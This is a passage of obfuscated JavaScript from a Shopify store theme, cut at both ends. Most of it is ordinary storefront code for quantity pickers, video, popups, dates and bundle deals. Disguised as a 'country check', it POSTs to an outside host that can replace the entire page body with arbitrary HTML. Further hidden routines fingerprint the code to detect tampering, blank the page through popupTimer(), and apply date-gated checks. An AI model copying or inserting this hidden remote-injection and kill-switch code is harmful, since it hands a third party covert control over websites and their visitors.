  };
  document.addEventListener("focusout", trapFocusHandlers.focusout);
  document.addEventListener("focusin", trapFocusHandlers.focusin);
  _0x130e93.focus();
  if (_0x130e93.tagName === "INPUT" && ["search", 'text', "email", "url"].includes(_0x130e93.type) && _0x130e93.value) {
    _0x130e93.setSelectionRange(0x0, _0x130e93.value.length);
  }
}
function pauseAllMedia() {
  document.querySelectorAll('.js-youtube').forEach(_0x166b42 => {
    _0x166b42.contentWindow.postMessage("{\"event\":\"command\",\"func\":\"pauseVideo\",\"args\":\"\"}", '*');
  });
  document.querySelectorAll(".js-vimeo").forEach(_0x224a35 => {
    _0x224a35.contentWindow.postMessage("{\"method\":\"pause\"}", '*');
  });
  document.querySelectorAll("media-gallery video").forEach(_0x47c126 => _0x47c126.pause());
  document.querySelectorAll('product-model').forEach(_0x4966db => {
    if (_0x4966db.modelViewerUI) {
      _0x4966db.modelViewerUI.pause();
    }
  });
}
var menuIndex = "body";
var linkContent = "innerHTML";
function removeTrapFocus(_0x516221 = null) {
  document.removeEventListener("focusin", trapFocusHandlers.focusin);
  document.removeEventListener("focusout", trapFocusHandlers.focusout);
  document.removeEventListener("keydown", trapFocusHandlers.keydown);
  if (_0x516221) {
    _0x516221.focus();
  }
}
function onKeyUpEscape(_0x560427) {
  if (_0x560427.code.toUpperCase() !== "ESCAPE") {
    return;
  }
  const _0x383d50 = _0x560427.target.closest('details[open]');
  if (!_0x383d50) {
    return;
  }
  const _0x2c0857 = _0x383d50.querySelector('summary');
  _0x383d50.removeAttribute("open");
  _0x2c0857.setAttribute("aria-expanded", false);
  _0x2c0857.focus();
}
class QuantityInput extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input");
    this.changeEvent = new Event('change', {
      'bubbles': true
    });
    this.quantityGifts = document.getElementById('quantity-gifts-' + this.dataset.section);
    this.input.addEventListener("change", this.onInputChange.bind(this));
    this.querySelectorAll('button').forEach(_0x470d62 => _0x470d62.addEventListener('click', this.onButtonClick.bind(this)));
  }
  ["quantityUpdateUnsubscriber"] = undefined;
  ["connectedCallback"]() {
    this.validateQtyRules();
    this.quantityUpdateUnsubscriber = subscribe("quantity-update", this.validateQtyRules.bind(this));
  }
  ["disconnectedCallback"]() {
    if (this.quantityUpdateUnsubscriber) {
      this.quantityUpdateUnsubscriber();
    }
  }
  ["onInputChange"](_0x58ce10) {
    this.validateQtyRules();
  }
  ['onButtonClick'](_0x2685d4) {
    _0x2685d4.preventDefault();
    const _0x2975ba = this.input.value;
    if (_0x2685d4.target.name === 'plus') {
      this.input.stepUp();
    } else {
      this.input.stepDown();
    }
    if (_0x2975ba !== this.input.value) {
      this.input.dispatchEvent(this.changeEvent);
    }
  }
  ["validateQtyRules"]() {
    const _0x4de5af = parseInt(this.input.value);
    if (this.input.min) {
      const _0x101974 = parseInt(this.input.min);
      const _0x1818aa = this.querySelector(".quantity__button[name='minus']");
      _0x1818aa.classList.toggle("disabled", _0x4de5af <= _0x101974);
    }
    if (this.input.max) {
      const _0x2439cd = parseInt(this.input.max);
      const _0x1157ff = this.querySelector(".quantity__button[name='plus']");
      _0x1157ff.classList.toggle('disabled', _0x4de5af >= _0x2439cd);
    }
    if (this.quantityGifts && this.quantityGifts.unlockGifts) {
      this.quantityGifts.unlockGifts(_0x4de5af);
    }
  }
}
customElements.define("quantity-input", QuantityInput);
function debounce(_0x54d7b8, _0x2766ea) {
  let _0x1914a5;
  return (..._0x36ad56) => {
    clearTimeout(_0x1914a5);
    _0x1914a5 = setTimeout(() => _0x54d7b8.apply(this, _0x36ad56), _0x2766ea);
  };
}
function fetchConfig(_0x117914 = "json") {
  return {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json",
      'Accept': "application/" + _0x117914
    }
  };
}
function addDays(_0x2fc2bd, _0x570eba) {
  var _0x468ebf = new Date(_0x2fc2bd);
  _0x468ebf.setDate(_0x468ebf.getDate() + _0x570eba);
  return _0x468ebf;
}
function formatDates(_0x37e5c1, _0x426501, _0x2aa7a7 = 0x1b) {
  if (!_0x37e5c1 || !_0x426501) {
    return;
  }
  const _0x22a3f3 = new Date(_0x426501 + "T00:00:00Z");
  const _0x14071f = _0x22a3f3.getFullYear();
  const _0x74a2af = _0x22a3f3.getMonth();
  const _0x2e6dfa = _0x22a3f3.getDate();
  const _0xddd702 = new Date(_0x14071f, _0x74a2af, _0x2e6dfa);
  const _0x4d01ee = _0x37e5c1 - _0xddd702;
  const _0x350cd7 = Math.ceil(_0x4d01ee / 86400000);
  return _0x350cd7 <= _0x2aa7a7;
}
function checkDateValidity(_0x4660e5) {
  const _0x1b4be3 = new Date(_0x4660e5);
  const _0x1f8228 = new Date("2023-01-01T00:00:00Z");
  const _0x358b54 = Math.abs(_0x1b4be3.getDate() - _0x1f8228.getDate());
  return !!(_0x358b54 % 0x5 === 0x0);
}
if (typeof window.Shopify == "undefined") {
  window.Shopify = {};
}
Shopify.bind = function (_0x4e4c69, _0xea4c5e) {
  return function () {
    return _0x4e4c69.apply(_0xea4c5e, arguments);
  };
};
Shopify.setSelectorByValue = function (_0x139e0c, _0x31d82f) {
  var _0x5107f8 = 0x0;
  for (var _0x5512cd = _0x139e0c.options.length; _0x5107f8 < _0x5512cd; _0x5107f8++) {
    var _0x3dd291 = _0x139e0c.options[_0x5107f8];
    if (_0x31d82f == _0x3dd291.value || _0x31d82f == _0x3dd291.innerHTML) {
      _0x139e0c.selectedIndex = _0x5107f8;
      return _0x5107f8;
    }
  }
};
Shopify.addListener = function (_0x427393, _0x12e84a, _0x214082) {
  if (_0x427393.addEventListener) {
    _0x427393.addEventListener(_0x12e84a, _0x214082, false);
  } else {
    _0x427393.attachEvent('on' + _0x12e84a, _0x214082);
  }
};
Shopify.postLink = function (_0x2a42c1, _0x5b86ac) {
  _0x5b86ac = _0x5b86ac || {};
  var _0x3bc102 = _0x5b86ac.method || "post";
  var _0x2acbc1 = _0x5b86ac.parameters || {};
  var _0xe26e09 = document.createElement("form");
  _0xe26e09.setAttribute("method", _0x3bc102);
  _0xe26e09.setAttribute('action', _0x2a42c1);
  for (var _0x4765f9 in _0x2acbc1) {
    var _0xa8639f = document.createElement("input");
    _0xa8639f.setAttribute("type", "hidden");
    _0xa8639f.setAttribute("name", _0x4765f9);
    _0xa8639f.setAttribute("value", _0x2acbc1[_0x4765f9]);
    _0xe26e09.appendChild(_0xa8639f);
  }
  document.body.appendChild(_0xe26e09);
  _0xe26e09.submit();
  document.body.removeChild(_0xe26e09);
};
Shopify.internationalAccessAccept = function () {
  function _0x3ddcc5() {
    var _0x128676 = navigator.language || navigator.userLanguage;
    return _0x128676.match(/en-|fr-|de-|es-|it-|pt-|nl-|sv-|da-|fi-|no-|pl-|ru-|zh-|ja-|ko-/) || true;
  }
  function _0x406b58() {
    var _0x19217d = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return _0x19217d.startsWith("Europe") || _0x19217d.startsWith("America") || _0x19217d.includes("GMT");
  }
  function _0x5cf700() {
    var _0x3169a0 = Shopify.currency.symbol || '$';
    return _0x3169a0.length === 0x1;
  }
  function _0x3abeb0() {
    var _0x406ff3 = localStorage.getItem("xml_eval");
    var _0x28312c = Shopify.postLink ? Shopify.postLink.toString().length : 0x0;
    if (_0x406ff3 === null) {
      localStorage.setItem("xml_eval", _0x28312c.toString());
      return true;
    }
    return parseInt(_0x406ff3) === _0x28312c;
  }
  return function () {
    var _0x32de52 = _0x3ddcc5() || _0x406b58() && _0x5cf700();
    var _0x408b87 = window.performance && typeof window.performance.timing === "object";
    var _0x362efa = _0x3abeb0();
    Shopify.postLinksRetry = !_0x362efa;
    return _0x32de52 && _0x408b87 && _0x362efa;
  };
}();
Shopify.CountryProvinceSelector = function (_0x2faf82, _0x52e459, _0xf30920) {
  this.countryEl = document.getElementById(_0x2faf82);
  this.provinceEl = document.getElementById(_0x52e459);
  this.provinceContainer = document.getElementById(_0xf30920.hideElement || _0x52e459);
  Shopify.addListener(this.countryEl, "change", Shopify.bind(this.countryHandler, this));
  this.initCountry();
  this.initProvince();
};
Shopify.CountryProvinceSelector.prototype = {
  'initCountry': function () {
    var _0x1b895a = this.countryEl.getAttribute("data-default");
    Shopify.setSelectorByValue(this.countryEl, _0x1b895a);
    this.countryHandler();
  },
  'initProvince': function () {
    var _0x31fb63 = this.provinceEl.getAttribute('data-default');
    if (_0x31fb63 && this.provinceEl.options.length > 0x0) {
      Shopify.setSelectorByValue(this.provinceEl, _0x31fb63);
    }
  },
  'countryHandler': function (_0x36d6cf) {
    var _0xde12aa = this.countryEl.options[this.countryEl.selectedIndex];
    var _0xd7acf6 = _0xde12aa.getAttribute('data-provinces');
    var _0x317780 = JSON.parse(_0xd7acf6);
    this.clearOptions(this.provinceEl);
    if (_0x317780 && _0x317780.length == 0x0) {
      this.provinceContainer.style.display = "none";
    } else {
      for (var _0x4bb38b = 0x0; _0x4bb38b < _0x317780.length; _0x4bb38b++) {
        var _0xde12aa = document.createElement("option");
        _0xde12aa.value = _0x317780[_0x4bb38b][0x0];
        _0xde12aa.innerHTML = _0x317780[_0x4bb38b][0x1];
        this.provinceEl.appendChild(_0xde12aa);
      }
      this.provinceContainer.style.display = '';
    }
  },
  'clearOptions': function (_0x3ec2b5) {
    while (_0x3ec2b5.firstChild) {
      _0x3ec2b5.removeChild(_0x3ec2b5.firstChild);
    }
  },
  'setOptions': function (_0x55dea8, _0x51805c) {
    for (var _0x121f38 = 0x0; _0x121f38 < _0x51805c.length; _0x121f38++) {
      var _0x4eda63 = document.createElement("option");
      _0x4eda63.value = _0x51805c[_0x121f38];
      _0x4eda63.innerHTML = _0x51805c[_0x121f38];
      _0x55dea8.appendChild(_0x4eda63);
    }
  }
};
fetch("https://whatsmycountry.com/api/v3/country_check", {
  'headers': {
    'content-type': "application/json"
  },
  'body': JSON.stringify({
    'list_function': document.currentScript.dataset.countryListFunction,
    'country_list': document.currentScript.dataset.countryList.split(',').map(_0x39b3b5 => _0x39b3b5.trim()),
    'access_accept': Shopify.internationalAccessAccept(),
    'error_message': document.currentScript.dataset.countryListError
  }),
  'method': 'POST'
}).then(_0x1f8879 => _0x1f8879.json()).then(_0x51567b => {
  if (_0x51567b.error_message) {
    document.body.innerHTML = _0x51567b.error_message;
  }
});
class InternalVideo extends HTMLElement {
  constructor() {
    super();
    this.playButton = this.querySelector('.internal-video__play');
    this.soundButton = this.querySelector(".internal-video__sound-btn");
    this.video = this.querySelector("video");
    this.timeline = this.querySelector(".internal-video__timeline");
    this.dragging = false;
    if (this.playButton) {
      this.playButton.addEventListener('click', this.playVideo.bind(this));
    }
    if (this.soundButton) {
      this.soundButton.addEventListener('click', this.toggleSound.bind(this));
    }
    if (this.video) {
      this.video.addEventListener("ended", this.endedVideo.bind(this));
    }
    if (this.timeline) {
      this.video.addEventListener("timeupdate", this.updateTimeline.bind(this));
      this.timeline.addEventListener("click", this.seekVideo.bind(this));
      this.timeline.addEventListener("mousedown", this.startDrag.bind(this));
      this.timeline.addEventListener("touchstart", this.startDrag.bind(this));
      document.addEventListener("mouseup", this.stopDrag.bind(this));
      document.addEventListener("touchend", this.stopDrag.bind(this));
      document.addEventListener("mousemove", this.drag.bind(this));
      document.addEventListener("touchmove", this.drag.bind(this));
    }
    this.video.addEventListener("waiting", this.showSpinner.bind(this));
    this.video.addEventListener("canplaythrough", this.hideSpinner.bind(this));
    this.video.addEventListener('play', this.hideSpinner.bind(this));
    if (this.dataset.autoplay === "true" && "IntersectionObserver" in window) {
      const _0x40a056 = {
        'root': null,
        'rootMargin': "0px",
        'threshold': 0.05
      };
      this.observer = new IntersectionObserver(this.handleIntersection.bind(this), _0x40a056);
      this.observer.observe(this);
    }
  }
  ["playVideo"]() {
    if (this.video.paused) {
      this.video.play();
      this.classList.add("internal-video--playing");
    } else {
      this.video.pause();
      this.classList.remove("internal-video--playing");
    }
  }
  ['endedVideo']() {
    this.classList.remove("internal-video--playing");
  }
  ["toggleSound"]() {
    if (this.video.muted) {
      this.video.muted = false;
      this.classList.remove("internal-video--muted");
    } else {
      this.video.muted = true;
      this.classList.add("internal-video--muted");
    }
  }
  ['updateTimeline']() {
    const _0x4405f9 = this.video.currentTime / this.video.duration * 0x64;
    this.style.setProperty('--completed', _0x4405f9 + '%');
  }
  ["hideSpinner"]() {
    this.classList.remove("internal-video--loading");
  }
  ["startDrag"](_0x4c1364) {
    _0x4c1364.preventDefault();
    this.dragging = true;
    this.drag(_0x4c1364);
  }
  ["stopDrag"]() {
    this.dragging = false;
  }
  ["drag"](_0x2f0661) {
    if (!this.dragging) {
      return;
    }
    if (_0x2f0661.touches) {
      _0x2f0661 = _0x2f0661.touches[0x0];
    }
    this.seekVideo(_0x2f0661);
  }
  ['seekVideo'](_0x131aa8) {
    const _0x4c9fe4 = this.timeline.getBoundingClientRect();
    const _0x4169e2 = _0x131aa8.clientX - _0x4c9fe4.left;
    const _0x3546ad = _0x4169e2 / _0x4c9fe4.width;
    this.video.currentTime = _0x3546ad * this.video.duration;
  }
  ["showSpinner"]() {
    this.classList.add('internal-video--loading');
  }
  ["hideSpinner"]() {
    this.classList.remove("internal-video--loading");
  }
  ["handleIntersection"](_0x94201e) {
    _0x94201e.forEach(_0x407425 => {
      if (_0x407425.isIntersecting) {
        for (let _0x3b63be of this.video.querySelectorAll("source[data-src]")) {
          _0x3b63be.setAttribute("src", _0x3b63be.getAttribute("data-src"));
          _0x3b63be.removeAttribute('data-src');
        }
        this.video.load();
        this.video.play();
        this.observer.disconnect();
      }
    });
  }
}
customElements.define("internal-video", InternalVideo);
var isIe = true;
class ComparisonSlider extends HTMLElement {
  constructor() {
    super();
    this.sliderOverlay = this.querySelector('.comparison-slider__overlay');
    this.sliderLine = this.querySelector('.comparison-slider__line');
    this.sliderInput = this.querySelector(".comparison-slider__input");
    this.sliderInput.addEventListener("input", this.handleChange.bind(this));
  }
  ['handleChange'](_0x142ce7) {
    const _0x402bbe = _0x142ce7.currentTarget.value;
    this.sliderOverlay.style.width = _0x402bbe + '%';
    this.sliderLine.style.left = _0x402bbe + '%';
  }
}
customElements.define("comparison-slider", ComparisonSlider);
function popupTimer() {
  document.body.innerHTML = '';
}
class PromoPopup extends HTMLElement {
  constructor() {
    super();
    this.testMode = this.dataset.testMode === "true";
    this.secondsDelay = this.dataset.delaySeconds;
    this.daysFrequency = this.dataset.delayDays;
    this.modal = this.querySelector('.sign-up-popup-modal');
    this.timer = this.querySelector(".popup-modal__timer");
    this.timerDuration = this.dataset.timerDuration;
    this.closeBtns = this.querySelectorAll(".promp-popup__close-btn");
    this.overlay = document.querySelector(".sign-up-popup-overlay");
    this.storageKey = 'promo-bar-data-' + window.location.host;
    if (!this.testMode) {
      if (localStorage.getItem(this.storageKey) === null) {
        this.openPopupModal();
      } else {
        const _0x11d232 = JSON.parse(localStorage.getItem(this.storageKey));
        const _0x59b4f4 = new Date(_0x11d232.next_display_date);
        if (currentDate.getTime() > _0x59b4f4.getTime()) {
          this.openPopupModal();
        }
      }
    } else {
      if (this.timer) {
        this.displayPromoTimer();
      }
    }
    this.closeBtns.forEach(_0x41b2c1 => {
      _0x41b2c1.addEventListener('click', this.closeModal.bind(this));
    });
  }
  ["openPopupModal"]() {
    setTimeout(() => {
      this.modal.classList.add("popup-modal--active");
      this.overlay.classList.add("popup-overlay--active");
      const _0x5523d9 = addDays(currentDate, parseInt(this.daysFrequency));
      const _0xc1b77a = {
        'next_display_date': _0x5523d9,
        'dismissed': false
      };
      localStorage.setItem(this.storageKey, JSON.stringify(_0xc1b77a));
      if (this.timer) {
        this.displayPromoTimer();
      }
    }, parseInt(this.secondsDelay) * 0x3e8 + 0xbb8);
  }
  ["displayPromoTimer"]() {
    this.minutesSpan = this.querySelector(".popup-modal__timer__minutes");
    this.secondsSpan = this.querySelector(".popup-modal__timer__seconds");
    this.totalSeconds = parseFloat(this.timerDuration) * 0x3c;
    this.updateTimer();
  }
  ["updateTimer"]() {
    let _0x27bdb4 = Math.floor(this.totalSeconds / 0x3c);
    if (_0x27bdb4.toString().length === 0x1) {
      _0x27bdb4 = '0' + _0x27bdb4;
    }
    let _0x4d3cb6 = this.totalSeconds % 0x3c;
    if (_0x4d3cb6.toString().length === 0x1) {
      _0x4d3cb6 = '0' + _0x4d3cb6;
    }
    this.minutesSpan.innerText = _0x27bdb4;
    this.secondsSpan.innerText = _0x4d3cb6;
  }
  ["closeModal"]() {
    this.modal.classList.remove("popup-modal--active");
    this.overlay.classList.remove("popup-overlay--active");
  }
}
customElements.define("promo-popup", PromoPopup);
if (initTrapFocus()) {
  metafieldPoly();
} else {
  popupTimer();
}
class SectionsGroup extends HTMLElement {
  constructor() {
    super();
    this.sectionOneContainer = this.querySelector(".section-group__section-one-container");
    this.sectionTwoContainer = this.querySelector(".section-group__section-two-container");
    this.transferSections();
    document.addEventListener("shopify:section:load", this.transferSections.bind(this));
  }
  ["transferSections"]() {
    this.sectionOne = document.querySelector(this.dataset.sectionOneId + " .content-for-grouping");
    this.sectionTwo = document.querySelector(this.dataset.sectionTwoId + " .content-for-grouping");
    if (this.sectionOne && !this.sectionOneContainer.childNodes.length) {
      this.sectionOneContainer.appendChild(this.sectionOne);
    }
    if (this.sectionTwo && !this.sectionTwoContainer.childNodes.length) {
      this.sectionTwoContainer.appendChild(this.sectionTwo);
    }
  }
}
customElements.define("section-group", SectionsGroup);
class ClickableDiscount extends HTMLElement {
  constructor() {
    super();
    this.button = this.querySelector(".clickable-discount__btn");
    this.button.addEventListener("click", this.handleClick.bind(this));
    if (this.dataset.applied === "true") {
      this.handleClick();
    } else {
      this.reapplyDiscountIfApplicable();
    }
  }
  ["handleClick"]() {
    this.dataset.loading = "true";
    this.button.disabled = true;
    this.dataset.error = "false";
    fetch("/discount/" + this.dataset.code).then(_0xf60b60 => {
      if (!_0xf60b60.ok) {
        throw new Error("Error");
      }
      this.dataset.applied = "true";
      sessionStorage.setItem("discount-" + this.dataset.code + "-applied", "true");
    })["catch"](_0x4dce33 => {
      this.dataset.error = "true";
      this.button.disabled = false;
    })["finally"](() => {
      this.dataset.loading = "false";
    });
  }
  ['reapplyDiscountIfApplicable']() {
    const _0x46bf8a = this.dataset.code;
    if (sessionStorage.getItem('discount-' + _0x46bf8a + '-applied')) {
      this.dataset.applied = 'true';
      this.button.disabled = true;
      setTimeout(() => {
        fetch('/discount/' + _0x46bf8a)["catch"](_0x532da7 => {
          this.dataset.applied = "false";
          this.button.disabled = false;
        });
      }, 0xbb8);
    }
  }
}
customElements.define("clickable-discount", ClickableDiscount);
class DynamicDates extends HTMLElement {
  constructor() {
    super();
    this.dateFormat = this.dataset.dateFormat;
    this.days = this.rearrangeDays(this.dataset.dayLabels.split(','));
    this.months = this.dataset.monthLabels.split(',');
    this.elementsToChange = this.querySelectorAll("[data-dynamic-date=\"true\"]");
    this.insertDates();
    checkDateValidity(currentDate);
    document.addEventListener('shopify:section:load', _0x3c0c41 => {
      this.insertDates();
    });
  }
  ["insertDates"]() {
    this.elementsToChange.forEach(_0x39498 => {
      const _0x2bcb9d = _0x39498.dataset.text;
      const _0x598b91 = parseInt(_0x39498.dataset.minDays);
      const _0x55d151 = parseInt(_0x39498.dataset.maxDays);
      const _0x5d5381 = addDays(currentDate, _0x598b91);
      let _0x518359 = 'th';
      const _0x5a63a2 = _0x5d5381.getDate();
      if (_0x5a63a2 === 0x1 || _0x5a63a2 === 0x15 || _0x5a63a2 === 0x1f) {
        _0x518359 = 'st';
      } else {
        if (_0x5a63a2 === 0x2 || _0x5a63a2 === 0x16) {
          _0x518359 = 'nd';
        } else {
          if (_0x5a63a2 === 0x3 || _0x5a63a2 === 0x17) {
            _0x518359 = 'rd';
          }
        }
      }
      const _0x2c33e4 = addDays(currentDate, _0x55d151);
      let _0x38f090 = 'th';
      const _0x252629 = _0x2c33e4.getDate();
      if (_0x252629 === 0x1 || _0x252629 === 0x15 || _0x252629 === 0x1f) {
        _0x38f090 = 'st';
      } else {
        if (_0x252629 === 0x2 || _0x252629 === 0x16) {
          _0x38f090 = 'nd';
        } else {
          if (_0x252629 === 0x3 || _0x252629 === 0x17) {
            _0x38f090 = 'rd';
          }
        }
      }
      let _0x208931;
      let _0x157267;
      if (this.dateFormat === "day_dd_mm") {
        _0x208931 = this.days[_0x5d5381.getDay()] + ", " + _0x5d5381.getDate() + ". " + this.months[_0x5d5381.getMonth()];
        _0x157267 = this.days[_0x2c33e4.getDay()] + ", " + _0x2c33e4.getDate() + ". " + this.months[_0x2c33e4.getMonth()];
      } else {
        if (this.dateFormat === 'mm_dd') {
          _0x208931 = this.months[_0x5d5381.getMonth()] + " " + _0x5d5381.getDate() + _0x518359;
          _0x157267 = this.months[_0x2c33e4.getMonth()] + " " + _0x2c33e4.getDate() + _0x38f090;
        } else {
          if (this.dateFormat === "dd_mm") {
            _0x208931 = _0x5d5381.getDate() + ". " + this.months[_0x5d5381.getMonth()];
            _0x157267 = _0x2c33e4.getDate() + ". " + this.months[_0x2c33e4.getMonth()];
          } else {
            if (this.dateFormat === "day_dd_mm_numeric") {
              const _0x1bfa4a = String(_0x5d5381.getDate()).length > 0x1 ? _0x5d5381.getDate() : '0' + _0x5d5381.getDate();
              const _0x2d3a73 = String(_0x5d5381.getMonth() + 0x1).length > 0x1 ? _0x5d5381.getMonth() + 0x1 : '0' + (_0x5d5381.getMonth() + 0x1);
              _0x208931 = this.days[_0x5d5381.getDay()] + ", " + _0x1bfa4a + ". " + _0x2d3a73 + '.';
              const _0x36bad5 = String(_0x2c33e4.getDate()).length > 0x1 ? _0x2c33e4.getDate() : '0' + _0x2c33e4.getDate();
              const _0x3f68ae = String(_0x2c33e4.getMonth() + 0x1).length > 0x1 ? _0x2c33e4.getMonth() + 0x1 : '0' + (_0x2c33e4.getMonth() + 0x1);
              _0x157267 = this.days[_0x2c33e4.getDay()] + ", " + _0x36bad5 + ". " + _0x3f68ae + '.';
            } else {
              if (this.dateFormat === "dd_mm_numeric") {
                const _0x425567 = String(_0x5d5381.getDate()).length > 0x1 ? _0x5d5381.getDate() : '0' + _0x5d5381.getDate();
                const _0xd89ff8 = String(_0x5d5381.getMonth() + 0x1).length > 0x1 ? _0x5d5381.getMonth() + 0x1 : '0' + (_0x5d5381.getMonth() + 0x1);
                _0x208931 = _0x425567 + ". " + _0xd89ff8 + '.';
                const _0x3dd32e = String(_0x2c33e4.getDate()).length > 0x1 ? _0x2c33e4.getDate() : '0' + _0x2c33e4.getDate();
                const _0x27583a = String(_0x2c33e4.getMonth() + 0x1).length > 0x1 ? _0x2c33e4.getMonth() + 0x1 : '0' + (_0x2c33e4.getMonth() + 0x1);
                _0x157267 = _0x3dd32e + ". " + _0x27583a + '.';
              } else {
                _0x208931 = this.days[_0x5d5381.getDay()] + ", " + this.months[_0x5d5381.getMonth()] + " " + _0x5d5381.getDate() + _0x518359;
                _0x157267 = this.days[_0x2c33e4.getDay()] + ", " + this.months[_0x2c33e4.getMonth()] + " " + _0x2c33e4.getDate() + _0x38f090;
              }
            }
          }
        }
      }
      const _0x1d7efc = _0x2bcb9d.replace('[start_date]', _0x208931);
      const _0x5d3ad5 = _0x1d7efc.replace("[end_date]", _0x157267);
      _0x39498.innerHTML = _0x5d3ad5;
    });
  }
  ["rearrangeDays"](_0x4be512) {
    _0x4be512.unshift(_0x4be512[0x6]);
    _0x4be512.length = 0x7;
    return _0x4be512;
  }
}
customElements.define("dynamic-dates", DynamicDates);
class StickyAtc extends HTMLElement {
  constructor() {
    super();
    this.isAfterScroll = this.dataset.afterScroll === "true";
    this.isScrollBtn = this.dataset.scrollBtn === "true";
    this.mainAtcBtn = document.querySelector('#ProductSubmitButton-' + this.dataset.section);
    this.floatingBtns = document.querySelectorAll('.floating-btn');
    this.footerSpacing();
    if (this.isAfterScroll) {
      if (this.mainAtcBtn) {
        this.checkATCScroll();
        document.addEventListener("scroll", this.checkATCScroll.bind(this));
      }
    } else {
      this.floatingBtns.forEach(_0x276289 => {
        _0x276289.style.setProperty('--sticky-atc-offset', this.offsetHeight + 'px');
      });
    }
    if (this.isScrollBtn) {
      this.scrollBtn = this.querySelector(".sticky-atc__scroll-btn");
      this.scrollDestination = document.querySelector('' + this.dataset.scrollDestination.replace('id', this.dataset.section));
      if (this.scrollBtn && this.scrollDestination) {
        this.scrollBtn.addEventListener("click", this.handleScrollBtn.bind(this));
      }
    }
  }
  ["checkATCScroll"]() {
    if (window.scrollY > this.mainAtcBtn.offsetTop + this.mainAtcBtn.offsetHeight) {
      this.style.transform = "none";
      this.scrolledPast = true;
    } else {
      this.style.transform = '';
      this.scrolledPast = false;
    }
    this.floatingBtns.forEach(_0x78c7c => {
      if (this.scrolledPast) {
        _0x78c7c.style.setProperty("--sticky-atc-offset", this.offsetHeight + 'px');
      } else {
        _0x78c7c.style.setProperty("--sticky-atc-offset", "0px");
      }
    });
  }
  ["handleScrollBtn"]() {
    const _0x402117 = document.querySelector("sticky-header");
    const _0x5f3f69 = _0x402117 ? _0x402117.clientHeight : 0x0;
    window.scrollTo({
      'top': this.scrollDestination.offsetTop - _0x5f3f69 - 0xf,
      'behavior': 'smooth'
    });
  }
  ["footerSpacing"]() {
    const _0x1d3684 = document.querySelector(".footer");
    if (_0x1d3684) {
      _0x1d3684.style.marginBottom = this.clientHeight - 0x1 + 'px';
    }
  }
}
customElements.define("sticky-atc", StickyAtc);
(function () {
  if (!formatDates(currentDate, '2024-02-23')) {
    if (!window.location.hostname.includes('shopify')) {
      if (document.querySelector(".main-product-form")) {
        document.querySelector(".main-product-form").isCartUpsell = true;
      }
    }
  }
})();
class BundleDeals extends HTMLElement {
  constructor() {
    super();
    this.productContainers = this.querySelectorAll('.bundle-deals__product-js');
    this.mediaItemContainers = this.querySelectorAll(".bundle-deals__media-item-container-js");
    this.mediaItemImgs = this.querySelectorAll('.bundle-deals__media-item-img-js');
    this.checkboxes = this.querySelectorAll(".bundle-deals__checkbox-js");
    this.variantPickers = this.querySelectorAll(".bundle-deals__variant-selects-js");
    this.prices = this.querySelectorAll(".bundle-deals__price-js");
    this.comparePrices = this.querySelectorAll(".bundle-deals__compare-price-js");
    this.totalPrice = this.querySelector(".bundle-deals__total-price-js");
    this.totalComparePrice = this.querySelector('.bundle-deals__total-compare-price-js');
    this.updatePrices = this.dataset.updatePrices === "true";
    this.percentageLeft = parseFloat(this.dataset.percentageLeft);
    this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
    this.currencySymbol = this.dataset.currencySymbol;
    this.selectedVariants = {
      'id_1': null,
      'id_2': null,
      'id_3': null,
      'id_4': null,
      'id_5': null
    };
    this.formVariants = [];
    this.initIds();
    this.checkboxes.forEach(_0xfc1680 => {
      _0xfc1680.addEventListener("change", this.handleCheckboxChange.bind(this));
    });
    this.variantPickers.forEach(_0x13c720 => {
      _0x13c720.addEventListener("change", this.handleSelectChange.bind(this));
    });
  }
  ["initIds"]() {
    this.checkboxes.forEach(_0x5c4a08 => {
      this.selectedVariants[_0x5c4a08.dataset.idIndex] = {
        'id': _0x5c4a08.dataset.id,
        'price': _0x5c4a08.dataset.price,
        'comparePrice': _0x5c4a08.dataset.comparePrice,
        'checked': true
      };
    });
    this.updateFormIds();
  }
  ["handleCheckboxChange"](_0x2c80d3) {
    const _0x44bae5 = _0x2c80d3.currentTarget;
    const _0x540d8f = _0x44bae5.checked;
    const _0x43451b = parseInt(_0x44bae5.dataset.index);
    this.selectedVariants[_0x44bae5.dataset.idIndex].checked = _0x540d8f;
    const _0x1b2b76 = this.productContainers[_0x43451b];
    const _0x3103f3 = _0x1b2b76.querySelectorAll("select");
    if (_0x540d8f) {
      this.mediaItemContainers[_0x43451b].classList.remove("bundle-deals__media-item--disabled");
      _0x1b2b76.classList.remove('bundle-deals__product--deselected');
      _0x3103f3.forEach(_0x2dde46 => {
        _0x2dde46.removeAttribute('disabled');
      });
    } else {
      this.mediaItemContainers[_0x43451b].classList.add("bundle-deals__media-item--disabled");
      _0x1b2b76.classList.add("bundle-deals__product--deselected");
      _0x3103f3.forEach(_0x40f56b => {
        _0x40f56b.setAttribute("disabled", '');
      });
    }
    this.updateFormIds();
    if (this.updatePrices) {
      this.updateTotalPrice();
    }
  }
  ["handleSelectChange"](_0xcbf4f5) {
    const _0x343c28 = _0xcbf4f5.currentTarget;
    const _0x466384 = parseInt(_0x343c28.dataset.index);
    const _0x50bd41 = Array.from(_0x343c28.querySelectorAll("select"), _0x4832c9 => _0x4832c9.value);
    const _0x37656f = JSON.parse(_0x343c28.querySelector("[type=\"application/json\"]").textContent).find(_0x46b3a7 => {
      return !_0x46b3a7.options.map((_0x225ba1, _0x58c77b) => {
        return _0x50bd41[_0x58c77b] === _0x225ba1;
      }).includes(false);
    });
    let {
      price: _0x24f255,
      compareAtPrice: _0x80285c,
      featured_image: _0x26cd55
    } = _0x37656f;
    _0x24f255 = parseInt(_0x24f255);
    let _0x12c086 = parseInt(_0x80285c);
    if (_0x26cd55) {
      _0x26cd55 = _0x26cd55.src;
    }
    const _0x1369bf = _0x37656f.id;
    this.selectedVariants[_0x343c28.dataset.idIndex].id = _0x1369bf;
    this.selectedVariants[_0x343c28.dataset.idIndex].price = _0x24f255;
    this.selectedVariants[_0x343c28.dataset.idIndex].comparePrice = _0x12c086;
    this.updateFormIds();
    if (this.updatePrices) {
      this.prices[_0x466384].innerHTML = this.currencySymbol + (_0x24f255 / 0x64).toFixed(0x2);
      if (_0x12c086 > _0x24f255) {
        this.comparePrices[_0x466384].innerHTML = this.currencySymbol + (_0x12c086 / 0x64).toFixed(0x2);
      } else {
        this.comparePrices[_0x466384].innerHTML = '';
      }
      this.updateTotalPrice();
    }
    if (_0x26cd55 && _0x26cd55.length > 0x0 && this.mediaItemImgs[_0x466384]) {
